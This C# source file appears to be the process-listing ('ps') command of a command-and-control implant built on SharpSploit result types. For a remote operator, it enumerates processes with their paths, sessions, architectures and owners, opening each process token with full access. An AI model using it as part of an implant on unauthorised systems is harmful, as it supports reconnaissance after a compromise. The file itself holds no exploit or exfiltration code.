using Agent.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class ListProcessCommand : AgentCommand
    {
        public override string Name => "ps";
        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
        {


            var list = new List<ListProcessResult>();
            string filter = null;
            if (task.SplittedArgs.Length == 1)
            {
                filter = task.SplittedArgs[0];
            }

            var processes = Process.GetProcesses();
            if (!string.IsNullOrEmpty(filter))
                processes = processes.Where(p => p.ProcessName.ToLower().Contains(filter.ToLower())).ToArray();

            foreach (var process in processes)
            {
                var res = new ListProcessResult()
                {
                    Name = process.ProcessName,
                    Id = process.Id,
                    SessionId = process.SessionId,
                    ProcessPath = GetProcessPath(process),
                    Owner = GetProcessOwner(process),
                    Arch = GetProcessArch(process),
                };

                list.Add(res);
            }

            var results = new SharpSploitResultList<ListProcessResult>();
            results.AddRange(list.OrderBy(f => f.Name).ThenBy(f => f.Name));
            result.Result = results.ToString();
        }

        private string GetProcessPath(Process proc)
        {
            try
            {
                return proc.MainModule.FileName;
            }
            catch
            {
                return "-";
            }
        }

        public string GetProcessOwner(Process proc)
        {
            var hToken = IntPtr.Zero;
            try
            {
                if (!Native.Advapi.OpenProcessToken(proc.Handle, Native.Advapi.DesiredAccess.TOKEN_ALL_ACCESS, out hToken))
                    return "-";

                var identity = new WindowsIdentity(hToken);
                return identity.Name;
            }
            catch
            {
                return "-";
            }
            finally
            {
                Native.Kernel32.CloseHandle(hToken);
            }
        }

        public static bool Is64bitProcess(Process proc)
        {
            try
            {
                var is64BitOS = Environment.Is64BitOperatingSystem;

                if (!is64BitOS)
                    return false;


                if (!Native.Kernel32.IsWow64Process(proc.Handle, out var isWow64))
                    return false;

                if (isWow64)
                    return false;

                return true;
            }
            catch (Exception e)
            {
                return false;
            }
        }

        public string GetProcessArch(Process proc)
        {
            try
            {
                var is64BitOS = Environment.Is64BitOperatingSystem;

                if (!is64BitOS)
                    return "x86";


                if (!Native.Kernel32.IsWow64Process(proc.Handle, out var isWow64))
                    return "-";

                if (isWow64)
                    return "x86";

                return "x64";
            }
            catch(Exception e)
            {
                return "-";
            }
        }


        public sealed class ListProcessResult : SharpSploitResult
        {
            public string Name { get; set; }

            public int Id { get; set; }

            public int SessionId { get; set; }

            public string ProcessPath { get; set; }

            public string Owner { get; set; }

            public string Arch { get; set; }

            protected internal override IList<SharpSploitResultProperty> ResultProperties => new List<SharpSploitResultProperty>()
            {
                new SharpSploitResultProperty { Name = nameof(Name), Value = Name },
                new SharpSploitResultProperty { Name = "PID", Value = Id },
                new SharpSploitResultProperty { Name = nameof(SessionId), Value = SessionId },
                new SharpSploitResultProperty { Name = nameof(ProcessPath), Value = ProcessPath },
                new SharpSploitResultProperty { Name = nameof(Owner), Value = Owner },
                new SharpSploitResultProperty { Name = nameof(Arch), Value = Arch },
            };
        }
    }
}
